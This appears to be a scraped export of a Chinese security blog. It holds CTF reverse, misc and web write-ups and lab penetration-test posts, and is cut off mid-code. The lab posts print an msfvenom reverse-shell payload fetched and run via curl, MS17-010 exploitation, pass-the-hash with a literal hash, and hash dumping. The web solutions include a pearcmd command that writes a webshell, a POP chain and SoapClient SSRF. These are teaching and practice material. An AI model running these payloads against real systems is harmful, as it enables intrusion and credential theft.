s:\rprint(chr(ord(i)^9),end=\u0026#39;\u0026#39;)\r#LitCTF{XOR_1s_3asy_to_OR} enbase64 #\rF5查看伪代码\n可以看到输入字符串长度是33，然后进入Base64加密，最后再进行check\n由于Source不是标准的Base64表，这个可以在Base64函数里看到有个Basechange，对表做了修改\n可以让AI跑一个脚本，注意了这里有一位是没有赋值的，也就是v3[33]\nv3 = [\r16, 34, 56, 7, 46, 2, 10, 44, 20, 41,\r59, 31, 51, 60, 61, 26, 5, 40, 21, 38,\r4, 54, 52, 47, 3, 11, 58, 48, 32, 15,\r49, 14, 37, 0, 55, 53, 24, 35, 18, 25,\r33, 43, 50, 39, 12, 19, 13, 42, 9, 17,\r28, 30, 23, 36, 1, 22, 57, 63, 8, 27,\r6, 62, 45, 29\r]\rsource = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34;\rfor i in range(48):\r# 创建一个临时列表，用于存储置换后的字符\rtemp = [\u0026#39;\u0026#39;] * 64\r# 遍历索引数组，按照索引交换字符\rfor j in range(64):\rtemp[j] = source[v3[j]]\r# 将临时列表赋值给原始字符串\rsource = \u0026#39;\u0026#39;.join(temp) # 直接将列表转换为字符串\rprint(source)\r#gJ1BRjQie/FIWhEslq7GxbnL26M4+HXUtcpmVTKaydOP38of5v90ZSwrkYzCAuND 进入赛播厨师，换表就能得到flag\nsnake #\r附件给的是一个pyc文件，不能用IDA来进行反编译\npycdc配置和使用-CSDN博客 Python 什么是Bad Magic Number错误|极客笔记 (deepinout.com) 在Python中，每个.pyc文件（即Python字节码文件）都包含一个魔术数字（Magic Number）来识别版本兼容性。当我们尝试加载一个.pyc文件时，Python会检查文件中的魔术数字是否与当前\n解释器版本匹配。如果不匹配，就会引发Bad Magic Number错误。\n查看文件头发现什么都没有\n结合文件名的37，猜测python版本应该是3.7\nPython逆向全版本MagicNumber表_python3.11.4 magicnumber-CSDN博客 反编译后可以看到，分数超过1000就有flag\n直接复制他的代码会乱码，指定编码也没用\n细看他的赋值逻辑是有问题的，后值在使用前值的时候，前值是已经被修改过的，这样就会导致不准确\nflag = [\r30, 196, 52, 252, 49, 220, 7, 243,\r3, 241, 24, 224, 40, 230, 25, 251,\r28, 233, 40, 237, 4, 225, 4, 215,\r40, 231, 22, 237, 14, 251, 10, 169\r]\rfor i in range(0, len(flag), 2):\rtemp=flag[i]\rflag[i] = flag[i + 1] ^ 136\rflag[i + 1] = temp ^ 119\r# 将结果转换为字节并解码为字符串\rdecoded_flag = bytes(flag).decode(errors=\u0026#39;ignore\u0026#39;)\rprint(decoded_flag)\r#LitCTF{python_snake_is_so_easy!} 程序和人有一个能跑就行了 #\r这个sub_4015A0函数可以让AI进行分析，符合RC4加密的特征\n在底部代码里存在逻辑错误，无论是否比较成功，都会输出U are right?\n可以打个断点看看过程\n使用windows的debugger\n这里是一些IDA的使用技巧\n多次步过之后发现一段字节，可能是密文\n.text:00475BBA mov byte ptr [esp+83h], 8Dh\r.text:00475BC2 mov byte ptr [esp+84h], 6Ch ; \u0026#39;l\u0026#39;\r.text:00475BCA mov byte ptr [esp+85h], 85h\r.text:00475BD2 mov byte ptr [esp+86h], 76h ; \u0026#39;v\u0026#39;\r.text:00475BDA mov byte ptr [esp+87h], 32h ; \u0026#39;2\u0026#39;\r.text:00475BE2 mov byte ptr [esp+88h], 72h ; \u0026#39;r\u0026#39;\r.text:00475BEA mov byte ptr [esp+89h], 0B7h\r.text:00475BF2 mov byte ptr [esp+8Ah], 43h ; \u0026#39;C\u0026#39;\r.text:00475BFA mov byte ptr [esp+8Bh], 85h\r.text:00475C02 mov byte ptr [esp+8Ch], 7Bh ; \u0026#39;{\u0026#39;\r.text:00475C0A mov byte ptr [esp+8Dh], 85h\r.text:00475C12 mov byte ptr [esp+8Eh], 0DEh\r.text:00475C1A mov byte ptr [esp+8Fh], 0C1h\r.text:00475C22 mov byte ptr [esp+90h], 0FBh\r.text:00475C2A mov byte ptr [esp+91h], 2Eh ; \u0026#39;.\u0026#39;\r.text:00475C32 mov byte ptr [esp+92h], 64h ; \u0026#39;d\u0026#39;\r.text:00475C3A mov byte ptr [esp+93h], 7\r.text:00475C42 mov byte ptr [esp+94h], 0C8h\r.text:00475C4A mov byte ptr [esp+95h], 5Fh ; \u0026#39;_\u0026#39;\r.text:00475C52 mov byte ptr [esp+96h], 9Ah\r.text:00475C5A mov byte ptr [esp+97h], 35h ; \u0026#39;5\u0026#39;\r.text:00475C62 mov byte ptr [esp+98h], 18h\r.text:00475C6A mov byte ptr [esp+99h], 0ADh\r.text:00475C72 mov byte ptr [esp+9Ah], 0B5h\r.text:00475C7A mov byte ptr [esp+9Bh], 15h\r.text:00475C82 mov byte ptr [esp+9Ch], 92h\r.text:00475C8A mov byte ptr [esp+9Dh], 0BEh\r.text:00475C92 mov byte ptr [esp+9Eh], 1Bh\r.text:00475C9A mov byte ptr [esp+9Fh], 88h\r.text:00475CA2 call memcmp 然后让AI跑一个脚本即可\nfrom Crypto.Cipher import ARC4\r# 密钥和密文\rkey = b\u0026#39;litctf\u0026#39;\rciphertext = bytes([0x8D, 0x6C, 0x85, 0x76, 0x32, 0x72, 0xB7, 0x43, 0x85, 0x7B,\r0x85, 0xDE, 0xC1, 0xFB, 0x2E, 0x64, 0x07, 0xC8, 0x5F,\r0x9A, 0x35, 0x18, 0xAD, 0xB5, 0x15, 0x92, 0xBE, 0x1B, 0x88])\r# 创建RC4解密器\rcipher = ARC4.new(key)\r# 解密\rplaintext = cipher.decrypt(ciphertext)\r# 输出结果\rprint(plaintext.decode(\u0026#39;utf-8\u0026#39;, errors=\u0026#39;ignore\u0026#39;))\r#LitCTF{welcome_to_the_litctf} debase64 #\r题目是和Base64相关的\n首先注意到v15的长度必须是20\nsub_401520这个函数的功能类似于对v13进行解密，然后结果存到v4中\n最后对比v4的内容是否正确，这里可以看到比较的步长是2，而那几个数字可以使用十六进制表示，从而分成两个部分\n对v6打个断点进行调试\n可以注意到18ED才是6381，所以十六进制的两个字节需要置换\nimport base64\rdata=[0x46, 0xed, 0x18, 0x96, 0x56, 0x9E, 0xd2, 0x72, 0xb2, 0xb3, 0x80, 0x70]\rbytes_encoded = bytes(data)\rdecoded_bytes = base64.b64encode(bytes_encoded).decode(\u0026#39;utf-8\u0026#39;)\rprint(decoded_bytes)\r#Ru0Yllae0nKys4Bw 但是加密结果需要每四个字节进行逆序，看别人的文章似乎是伪代码中的Base64加密过程并不标准，也或许是因为程序的大端序存储。\n根据题目描述进行MD5爆破，得到flag\nfrom hashlib import md5\rimport string\rs = \u0026#34;Y0uReallyKn0wB4s\u0026#34;\rfor i in string.printable:\rtest = s + i + \u0026#34;===\u0026#34;\rif md5(test.encode()).hexdigest() == \u0026#34;5a3ebb487ad0046e52db00570339aace\u0026#34;:\rprint(test)\rbreak\r#NSSCTF{Y0uReallyKn0wB4s3===} For Aiur #\r使用64位IDA进行反编译，能够看出似乎是由pyinstaller进行打包的EXE文件\n反编译工具\nextremecoders-re/pyinstxtractor: PyInstaller Extractor (github.com) 对Probee.pyc进行反编译，从ch中引入了check函数\n这里有个注意点，需要使用python3.8版本，不然会找不到这个ch文件\nenc = [\r98, 77, 94, 91, 92, 107, 125, 66, 87, 70,\r113, 92, 83, 70, 85, 81, 19, 21, 109, 99,\r87, 107, 127, 65, 65, 64, 109, 87, 93, 90,\r65, 64, 64, 65, 81, 3, 109, 85, 86, 80,\r91, 64, 91, 91, 92, 0, 94, 107, 66, 77,\r94, 91, 92, 71\r]\rdef check(num):\rflag = \u0026#39;LitCTF{\u0026#39;\rif num % 2 == 0 and num % 4 == 0 and num % 6 == 0 and num % 8 == 0 and num % 12 == 0 and num % 13 == 11:\rk = str(num)\rfor i in range(len(enc)):\rflag += chr(ord(k[i % len(k)]) ^ enc[i])\rflag += \u0026#39;}\u0026#39;\rprint(flag)\rcheck(24)\r#LitCTF{Pylon_OverCharge!!_We_Must_construc7_addition4l_pylons} ","date":"2024-11-23","externalUrl":null,"permalink":"/posts/2024/11/litctf-2023-reverse/","section":"Posts","summary":"","title":"LitCTF-2023-Reverse","type":"posts"},{"content":"","date":"2024-11-23","externalUrl":null,"permalink":"/tags/reverse/","section":"Tags","summary":"","title":"Reverse","type":"tags"},{"content":"","date":"2024-11-21","externalUrl":null,"permalink":"/tags/misc/","section":"Tags","summary":"","title":"Misc","type":"tags"},{"content":"\r少年的ctf奇遇 #\r考点：LSB隐写、图片宽高修改\n题目描述：你说了图片里的一句话，老婆露出了这个表情。 LSB隐写原理 #\rLSB即为最低有效位，图片中的图像像素一般是由RGB三原色（红绿蓝）组成\n每一种颜色占用8位，取值范围为0x00~0xFF，即有256种颜色，一共包含了256的3次方的颜色\n而人的眼睛能够区分的颜色是有限的，LSB隐写就是修改RGB颜色分量的最低二进制位也就是最低有效位\nStegSolve #\r这里使用的是StegSolve工具，载入图片选用数据提取分析\n得到部分flag：NSSCTF{lao_po 宽高调整 #\r这里使用随波逐流工具\n可以看到高度和编码里的不一致，需要调整\n打开winhex或者010editor都行，我这里用的是winhex\n如图修改高度为01B7，也就是439\n保存之后再打开图片\n后半段：_s0_cute!} 一段有规律的声音 #\r答案格式为一串能连成话的简单英语主谓宾句子请所有字母全部大写,空格用_代替后包裹NSSCTF{}(提示：不止一种解法)\n一个音频里全是重复性的两种声音，不难想象到是摩斯密码的长短性\n・・・—・・— — —・・・—・—・— — — — — ・・— 提示说能组成一句简单的英语主谓宾句子\n经过尝试得到明文\n・・/・—・・/— — —/・・・—/・/—・— — /— — —/ ・・—/\rI LOVE YOU ez-QR #\r从题目来看是一道二维码的题目\n给的附件是一个GIF动图，会循环展示这个二维码的每个部分\n在线GIF图片帧拆分工具 - UU在线工具 (uutool.cn) 将其拆分得到九个部分\n弄一个画布进去拼接就好了，根据边角的空隙来判断\n在线画图软件_免费画图工具 - Canva可画 flag：NSSCTF{123fgh789okm} 怎么全是01，我flag呢 #\r我flag呢？我不到啊，滴滴答滴哒哒哒（提示：想想文件的本质是什么）\n因为只有01，并且要改变文件格式，这里还是考虑转换成二维码的形式\n字符串的长度总共是3600，可以将宽高设置为60×60\nfrom PIL import Image\rWIDTH = 60\rHEIGHT = 60 pic = Image.new(\u0026#34;RGB\u0026#34;, (WIDTH, HEIGHT))\rstr = \uu0026#34;\ri = 0\rfor y in range(0, HEIGHT):\rfor x in range(0, WIDTH):\rif (str[i] == \u0026#39;1\u0026#39;):\rpic.putpixel((x, y), (0, 0, 0))\relse:\rpic.putpixel((x, y), (255, 255, 255))\ri += 1\rpic.save(\u0026#34;flag.png\u0026#34;) NSSCTF{a51f0b9fb5fd47ca14332fa1acab352e} 从千年真理部到游戏开发部day1 #\r什么游戏叫base啊？我要玩游戏o(╥﹏╥)o，怎么玩游戏还要了解base编码，好难啊，苦呀西~\n看似是Base64加密，解密出来就是一段歌词，没有密码的痕迹\n搜索的到Base64编码也有隐写\n[MISC]Base64隐写-CSDN博客 # base64隐写\rimport base64\rdef get_diff(s1, s2):\rbase64chars = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;\rres = 0\rfor i in range(len(s2)):\rif s1[i] != s2[i]:\rreturn abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))\rreturn res\rdef b64_stego_decode():\rfile = open(\u0026#34;game.txt\u0026#34;, \u0026#34;rb\u0026#34;)\rx = \u0026#39;\u0026#39; # x即bin_str\rlines = file.readlines()\rfor line in lines:\rl = str(line, encoding=\u0026#34;utf-8\u0026#34;)\rstego = l.replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026#39;)\r# print(stego)\rrealtext = base64.b64decode(l)\r# print(realtext)\rrealtext = str(base64.b64encode(realtext), encoding=\u0026#34;utf-8\u0026#34;)\r# print(realtext)\rdiff = get_diff(stego, realtext) # diff为隐写字串与实际字串的二进制差值\rn = stego.count(\u0026#39;=\u0026#39;)\rif diff:\rx += bin(diff)[2:].zfill(n * 2)\relse:\rx += \u0026#39;0\u0026#39; * n * 2\ri = 0\rflag = \u0026#39;\u0026#39;\rwhile i \u0026lt; len(x):\rif int(x[i:i + 8], 2):\rflag += chr(int(x[i:i + 8], 2))\ri += 8\rprint(flag)\rif __name__ == \u0026#39;__main__\u0026#39;:\rb64_stego_decode()\r#game,G@mee 使用密码：game,G@mee\n比较明显的图片特征，拿到赛博厨师里面\nNSSCTF{The_god_of_the_game_field} ","date":"2024-11-21","externalUrl":null,"permalink":"/posts/2024/11/swpu-misc/","section":"Posts","summary":"","title":"SWPU-Misc","type":"posts"},{"content":"","date":"2024-11-17","externalUrl":null,"permalink":"/categories/engineering-practice/","section":"Categories","summary":"","title":"Engineering-Practice","type":"categories"},{"content":"\r前言 #\r本文是在攻破Windows Server 2016 DC的基础上对Windows PC 8089进行攻击\n信息收集 #\r回到WinServer 2016 DC的Meterpreter上，进入shell，如果使用了代理导致进不去，请参考前面几篇文章\n调整字符集，这样不会乱码\nipconfig /all 可以发现当前主机存在域\nC:\\Windows\\system32\u0026gt;powershell PS C:\\Windows\\system32\u0026gt; Get-ADComputer -Filter * C:\\Windows\\system32\u0026gt; systeminfo 可以看到这四台主机都在域内，而且域控是当前meterpreter的DC主机\n对8098主机进行简单扫描，开放端口：80，135，139，445，3306，7680\n其中3306端口我验证过了，应该是没有漏洞可以利用的，其余端口也是。\n因为存在135、445端口，可以尝试内网**PTH（pass-the-hash）**攻击\n在DC的Meterpreter里进行hashdump，拿到Administrator的hash\n域控的权限：域管理员（Domain Admins）组的成员可以在域内的任何计算机上登录\nPTH攻击 #\r这里使用kali自带的impacket-psexec就行\nproxychains impacket-psexec AEROSPACE/Administrator@172.22.10.40 -hashes \u0026#34;aad3b435b51404eeaad3b435b51404ee:4e4b335d557d9c79bc419490672102b2\u0026#34; 可以看到成功进入到Shell，如果编码乱了就执行chcp 65001\n并且由于具有最高权限，在Alice的目录下拿到flag03\n","date":"2024-11-17","externalUrl":null,"permalink":"/posts/2024/11/ep-win8098/","section":"Posts","summary":"","title":"EP-Win8098","type":"posts"},{"content":"\r前言 #\r这个主机毫无新意，这篇文章我都不想写，攻破这个主机的方法和前面8089是一模一样\nPTH攻击 #\r按道理来说，拿下域控的Administrator之后，整个域基本上就可以打穿了。\n这台主机依旧是使用pass-the-hash攻击\n只需要修改一下IP就能进去了\n在Administrator目录下拿到flag\n本次工程实践到此结束\n","date":"2024-11-17","externalUrl":null,"permalink":"/posts/2024/11/ep-winserverca/","section":"Posts","summary":"","title":"EP-WinServerCA","type":"posts"},{"content":"","date":"2024-11-17","externalUrl":null,"permalink":"/tags/%E5%B7%A5%E7%A8%8B%E5%AE%9E%E8%B7%B5/","section":"Tags","summary":"","title":"工程实践","type":"tags"},{"content":"\r前言 #\r本文是在8086那篇文章已经搭建好代理的情况下进行的\n漏洞扫描 #\r利用web01上的fscan对DC主机进行扫描，发现疑似存在MS17-010漏洞\n进入MSF，设置全局代理以及反向允许\nsetg Proxies socks5:127.0.0.1:46075\rset ReverseAllowProxy true 选取探测模块\nuse auxiliary/scanner/smb/smb_ms17_010\rset rhost 172.22.10.11 可以看到探测模块显示该靶机好像存在永恒之蓝漏洞\n接下来进一步攻击\nMS17-010 #\rsearch ms17-010\ruse 10 注意这里不要选取第0个模块，经过我的尝试使用他会导致靶机直接蓝屏\n这里用第10个\n配置如图\n可以看到反弹成功，不用提权\n直接就能读取到Admin目录下的flag\n","date":"2024-11-16","externalUrl":null,"permalink":"/posts/2024/11/ep-winserverdc/","section":"Posts","summary":"","title":"EP-WinServerDC","type":"posts"},{"content":"\r前言 #\r本文是在已经攻破EP-web01的基础上，对其内网中的Win8086进行攻击，最终获取到其权限\n漏洞扫描 #\r由于上篇文章已经可以远程登录Web01，这里直接上传fscan的windows版本，并且进行漏扫\n这里还是使用http传输文件\n#kali里面\r$ python -m http.server 80\r#win\rPS : curl 192.168.237.140/fscan.exe -O fscan.exe 好像扫到一个MS17-010的漏洞\n对36进行扫描也是发现MS17-010的漏洞\n搭建代理 #\r（题外话：为什么我要使用外部的工具呢？因为msf自带的socks_proxy我这里尝试了好像用不了，或许是我操作有问题，不过有工具用也是可以的）\nfrp内网穿透工具\nReleases · fatedier/frp (github.com) 这里使用的是V6.0的版本，分别下载linux和windows版本\n[common]\rbind_port = 7000 [common]\rserver_addr = 192.168.237.140 server_port = 7000 tls_enable = ture [plugin socks]\rtype = tcp plugin = socks5 remote_port = 46075 use_encryption = true\ruse_compression = true 其中windows的frp配置文件中的server_addr就是kali的IP，使用的代理端口就是46075\nweb01的主机上仍然使用curl -O的方式进行下载文件\n最后两端开启frp服务\n如图所示，frp代理开启成功\n回到Kali\n$ vim /etc/proxychains4.conf 在最下端如图配置即可\nMS17-010 #\r$ msfconsole 打开msfconsole，并且执行这两行命令，就不用再执行proxychains了\nsetg Proxies socks5:127.0.0.1:46075 #设置全局代理\rset ReverseAllowProxy true #这个参数是因为使用全局代理，可能会导致我们的shell无法反弹，所以需要开启。 然后正常的使用永恒之蓝的漏洞即可\n这里值得注意的是我使用的是bind_tcp，这是一个正向链接，因为kali通过代理是能访问到8086主机，而反过来是不行的。\n可以看到已经是最高权限了\n在C盘的Users的John用户目录下拿到第二个flag\n进入Shell，修改字符集为65001，不然会乱码\n其他的似乎并没有什么可以利用的东西了，这个靶机应该也就这样了\n","date":"2024-11-15","externalUrl":null,"permalink":"/posts/2024/11/ep-win8086/","section":"Posts","summary":"","title":"EP-Win8086","type":"posts"},{"content":"\r前言 #\r该靶机是目标局域网内的入口机器，本文目的是拿到Web01的最高权限并且实现远程登录\n信息收集 #\r$ arp-scan -l 发现存在一台IP值为：192.168.237.139的主机\n$ namp 192.168.237.139 简单扫描发现开放端口：21、80、1433，其中存在mssql服务\n使用Fscan进行扫描：Releases · shadow1ng/fscan (github.com)\n$ ./fscan -h 192.168.237.139 发现ftp服务存在匿名访问，不过没有任何泄露\nmssql服务存在弱口令\n反弹SHELL #\r下载mssql命令执行工具：Release mssql-command-tools · Mayter/mssql-command-tool\n并且生成powershell的反弹命令：HYH的反弹Shell生成器\nnc监听端口\n并且执行命令\n成功得到powershell的反弹\n权限提升 #\r当前用户权限为普通用户\n生成msf反弹木马\n$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.237.140 LPORT=6666 -f exe -o reverse.exe 并且开放http服务，让目标机器下载\n#kali\r$ python -m http.server 80\r#PS\rPS: curl 192.168.237.140/reverse.exe -O shell.exe 再开一个终端，打开msfconsole\n$ msfconsole 设置监听器handler，并配置\nmsf6 \u0026gt; use exploit/multi/handler msf6 exploit(multi/handler) \u0026gt; set payload windows/x64/meterpreter/reverse_tcp\rmsf6 exploit(multi/handler) \u0026gt; set lhost 192.168.237.140\rmsf6 exploit(multi/handler) \u0026gt; set lport 6666\rmsf6 exploit(multi/handler) \u0026gt; run 回到powershell那里运行exe文件\n可以看到成功进入meterpreter\n执行getsystem进行权限提升，如下图可以看到提升到了system最高权限\nmeterpreter \u0026gt; getsystem 进入administrator的目录下，拿到flag\n获取密码 #\r$meterpreter \u0026gt; hashdump 获取到用户密码hash值，这里只要Administrator的光标部分，是由md5进行加密的\n将其放入解密网站：MD5免费在线解密破解_MD5在线加密-SOMD5\n成功得到密码\n远程登录 #\r由于在真实的渗透测试环境下是无法直接接触到目标机器的，所以要找到远程登录的办法\n进行nmap全端口扫描\n$ nmap 192.168.237.139 -p- 发现存在5985端口，该端口用于Windows的远程管理\nevil-winrm是一个可用于黑客攻击/渗透测试的Windows远程管理(WinRM)Shell\n由于知道了管理员的密码可以直接登录\n$ evil-winrm -i 192.168.237.139 -u Administrator -p \u0026#39;xxxx\u0026#39; 登录成功\n","date":"2024-11-12","externalUrl":null,"permalink":"/posts/2024/11/ep-web01/","section":"Posts","summary":"","title":"EP-Web01","type":"posts"},{"content":"","date":"2024-10-31","externalUrl":null,"permalink":"/tags/geekchallenge/","section":"Tags","summary":"","title":"Geekchallenge","type":"tags"},{"content":"\r100%的⚪ #\rF12审计源码\nBase64解密\nbaby_upload #\r%00截断，属于nginx解析问题，会把file.ext当作php文件解析\nez_http #\rrce_me #\rif (!is_array($_POST[\u0026#34;start\u0026#34;])) {\rif (!preg_match(\u0026#34;/start.*now/is\u0026#34;, $_POST[\u0026#34;start\u0026#34;])) {\rif (strpos($_POST[\u0026#34;start\u0026#34;], \u0026#34;start now\u0026#34;) === false) {\rdie(\u0026#34;Well, you haven\u0026#39;t started.\u0026lt;br\u0026gt;\u0026#34;);\r}\r}\r} post：start=start now\nif (\rsha1((string) $_POST[\u0026#34;__2024.geekchallenge.ctf\u0026#34;]) == md5(\u0026#34;Geekchallenge2024_bmKtL\u0026#34;) \u0026amp;\u0026amp;\r(string) $_POST[\u0026#34;__2024.geekchallenge.ctf\u0026#34;] != \u0026#34;Geekchallenge2024_bmKtL\u0026#34; \u0026amp;\u0026amp;\ris_numeric(intval($_POST[\u0026#34;__2024.geekchallenge.ctf\u0026#34;]))\r)\r# md5(\u0026#34;Geekchallenge2024_bmKtL\u0026#34;)= 0e073277003087724660601042042394\r# sha1(10932435112)= 0e07766915004133176347055865026311692244 弱比较，使用0e科学计数法\nphp下划线trick：Bypass：URL非法参数名产生的绕过问题 - Icfh - 博客园 (cnblogs.com)\npost：_[2024.geekchallenge.ctf=10932435112\nforeach ($_GET as $key =\u0026gt; $value) {\r$$key = $value;\r} 接收任意GET参数并且转为变量\nif (intval($year) \u0026lt; 2024 \u0026amp;\u0026amp; intval($year + 1) \u0026gt; 2025) {\recho \u0026#34;Well, I know the year is 2024\u0026lt;br\u0026gt;\u0026#34;;\rif (preg_match(\u0026#34;/.+?rce/ism\u0026#34;, $purpose)) {\rdie(\u0026#34;nonono\u0026#34;);\r}\rif (stripos($purpose, \u0026#34;rce\u0026#34;) === false) {\rdie(\u0026#34;nonononono\u0026#34;);\r}\recho \u0026#34;Get the flag now!\u0026lt;br\u0026gt;\u0026#34;;\reval($GLOBALS[\u0026#39;code\u0026#39;]);\r} intval绕过，year=10e10\n正则直接传入purpose=rce即可\nez_include #\r相关文章：文件包含漏洞三道题_php require once 绕过-CSDN博客\n?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/starven_secret.php \u0026lt;?php\rerror_reporting(0);\rhighlight_file(__FILE__);\rif (isset($_GET [\u0026#34;syc\u0026#34;])){\r$file = $_GET [\u0026#34;syc\u0026#34;];\r$hint = \u0026#34;register_argc_argv = On\u0026#34;;\rif (preg_match(\u0026#34;/config|create|filter|download|phar|log|sess|-c|-d|%|data/i\u0026#34;, $file)) {\rdie(\u0026#34;hint都给的这么明显了还不会做?\u0026#34;);\r}\rif(substr($_SERVER[\u0026#39;REQUEST_URI\u0026#39;], -4) === \u0026#39;.php\u0026#39;){\rinclude $file;\r}\r} register_argc_argv 打开，可以使用pearcmd进行写入木马\n相关文章：利用 pearcmd 从 LFI 到 getshell (furina.org.cn)\n/levelllll2.php?syc=/usr/local/lib/php/pearcmd.php\u0026amp;+config-create+/\u0026lt;?=@eval($_POST[\u0026#39;shell\u0026#39;]);?\u0026gt;+/var/www/html/shell.php 一定要抓包把被转义的字符改回来\nCan_you_Pass_Me #\rSSTI工具：Marven11/Fenjing: 专为CTF设计的Jinja2 SSTI全自动绕WAF脚本 | A Jinja2 SSTI cracker for bypassing WAF, designed for CTF (github.com)\n稍等一会绕过\nProblem_On_My_Web #\r传入非法url报错看到源码\n再写一个alert(document.cookie)进去然后多点几下就行了\nSecretInDrivingSchool #\r源码泄露\n直接爆破就可以了，密码是：SYC@chengxing，不变的\nezpop #\r\u0026lt;?php\rClass lover{\rpublic $J1rry=\u0026#34;data://text/plain,Welcome GeekChallenge 2024\u0026#34;;\rpublic $meimeng=12312313;\rpublic function __destruct(){\rif(isset($this-\u0026gt;J1rry)\u0026amp;\u0026amp;file_get_contents($this-\u0026gt;J1rry)==\u0026#39;Welcome GeekChallenge 2024\u0026#39;){\r$this-\u0026gt;meimeng-\u0026gt;source;\r}\r}\rpublic function __invoke()\r{\recho $this-\u0026gt;meimeng;\r}\r}\rClass Geek{\rpublic $GSBP;\rpublic function __get($name){\r$Challenge = $this-\u0026gt;GSBP;\rreturn $Challenge();\r}\rpublic function __toString(){\r$this-\u0026gt;GSBP-\u0026gt;Getflag();\rreturn \u0026#34;\u0026#34;;\r}\r}\rClass SYC{\rpublic $starven=\u0026#34;php://filter/write=string.strip_tags/?\u0026gt;php_value auto_prepend_file /flag\\n#/resource=.htaccess\u0026#34; ;\r}\r$lover1 = new lover();\r$lover2 = new lover();\r$syc=new SYC();\r$geek1=new Geek();\r$geek1-\u0026gt;GSBP=$lover2;\r$geek2=new Geek();\r$lover1-\u0026gt;meimeng=$geek1;\r$lover2-\u0026gt;meimeng=$geek2;\r$geek2-\u0026gt;GSBP=$syc;\r$s=serialize($lover1);\r$s = preg_replace(\u0026#39;/s:7:\u0026#34;m/\u0026#39;, \u0026#39;S:7:\u0026#34;\\\\\\6d\u0026#39;, $s);\recho urlencode($s);\r#O%3A5%3A%22lover%22%3A2%3A%7Bs%3A5%3A%22J1rry%22%3Bs%3A44%3A%22data%3A%2F%2Ftext%2Fplain%2CWelcome+GeekChallenge+2024%22%3BS%3A7%3A%22%5C6deimeng%22%3BO%3A4%3A%22Geek%22%3A1%3A%7Bs%3A4%3A%22GSBP%22%3BO%3A5%3A%22lover%22%3A2%3A%7Bs%3A5%3A%22J1rry%22%3Bs%3A44%3A%22data%3A%2F%2Ftext%2Fplain%2CWelcome+GeekChallenge+2024%22%3BS%3A7%3A%22%5C6deimeng%22%3BO%3A4%3A%22Geek%22%3A1%3A%7Bs%3A4%3A%22GSBP%22%3BO%3A3%3A%22SYC%22%3A1%3A%7Bs%3A7%3A%22starven%22%3Bs%3A93%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dstring.strip_tags%2F%3F%3Ephp_value+auto_prepend_file+%2Fflag%0A%23%2Fresource%3D.htaccess%22%3B%7D%7D%7D%7D%7D 简单分析一下。首先是data的正则用16进制绕过，lover类的destruct触发Geek类的get魔术方法，进而触发lover的invoke，然后是Geek的tostring，最后进入到SYC的call方法。\n死亡exit的绕过：由于正则过滤的非常严格，无法直接写入php木马，但是可以通过写入htaccess配置文件预包含flag\nez_SSRF #\rwww.zip备份文件泄露\n#calculator.php\r\u0026lt;?php\r$admin=\u0026#34;aaaaaaaaaaaadmin\u0026#34;;\r$adminpass=\u0026#34;i_want_to_getI00_inMyT3st\u0026#34;;\rfunction check($auth) {\rglobal $admin,$adminpass;\r$auth = str_replace(\u0026#39;Basic \u0026#39;, \u0026#39;\u0026#39;, $auth);\r$auth = base64_decode($auth);\rlist($username, $password) = explode(\u0026#39;:\u0026#39;, $auth);\recho $username.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;.$password;\rif($username===$admin \u0026amp;\u0026amp; $password===$adminpass) {\rreturn 1;\r}else{\rreturn 2;\r}\r}\rif($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]!==\u0026#34;127.0.0.1\u0026#34;){\rexit(\u0026#34;Hacker\u0026#34;);\r}\r$expression = $_POST[\u0026#39;expression\u0026#39;];\r$auth=$_SERVER[\u0026#39;HTTP_AUTHORIZATION\u0026#39;];\rif(isset($auth)){\rif (check($auth)===2) {\rif(!preg_match(\u0026#39;/^[0-9+\\-*\\/]+$/\u0026#39;, $expression)) {\rdie(\u0026#34;Invalid expression\u0026#34;);\r}else{\r$result=eval(\u0026#34;return $expression;\u0026#34;);\rfile_put_contents(\u0026#34;result\u0026#34;,$result);\r}\r}else{\r$result=eval(\u0026#34;return $expression;\u0026#34;);\rfile_put_contents(\u0026#34;result\u0026#34;,$result);\r}\r}else{\rexit(\u0026#34;Hacker\u0026#34;);\r} #h4d333333.php\r\u0026lt;?php\rerror_reporting(0);\rif(!isset($_POST[\u0026#39;user\u0026#39;])){\r$user=\u0026#34;stranger\u0026#34;;\r}else{\r$user=$_POST[\u0026#39;user\u0026#39;];\r}\rif (isset($_GET[\u0026#39;location\u0026#39;])) {\r$location=$_GET[\u0026#39;location\u0026#39;];\r$client=new SoapClient(null,array(\r\u0026#34;location\u0026#34;=\u0026gt;$location,\r\u0026#34;uri\u0026#34;=\u0026gt;\u0026#34;hahaha\u0026#34;,\r\u0026#34;login\u0026#34;=\u0026gt;\u0026#34;guest\u0026#34;,\r\u0026#34;password\u0026#34;=\u0026gt;\u0026#34;gueeeeest!!!!\u0026#34;,\r\u0026#34;user_agent\u0026#34;=\u0026gt;$user.\u0026#34;\u0026#39;s Chrome\u0026#34;));\r$client-\u0026gt;calculator();\recho file_get_contents(\u0026#34;result\u0026#34;);\r}else{\recho \u0026#34;Please give me a location\u0026#34;;\r} 在calculator.php中，对ip的校验使用的是remote_addr，这个是无法通过HTTP头进行伪造的\n只能通过h4d333333.php对calculator进行请求\n相关文章：利用SoapClient类进行SSRF+CRLF攻击 | Xiaojian Yuan\u0026rsquo;s Homepage (lethe.site)\n\u0026lt;?php\r$target = \u0026#39;http://xxx/xxx.php\u0026#39;;\r$post_string = \u0026#39;expression=system(\u0026#34;cat /flag \u0026gt; flag\u0026#34;);\u0026#39;;\r$headers = array(\r\u0026#39;X-Forwarded-For: 127.0.0.1\u0026#39;,\r\u0026#39;AUTHORIZATION: 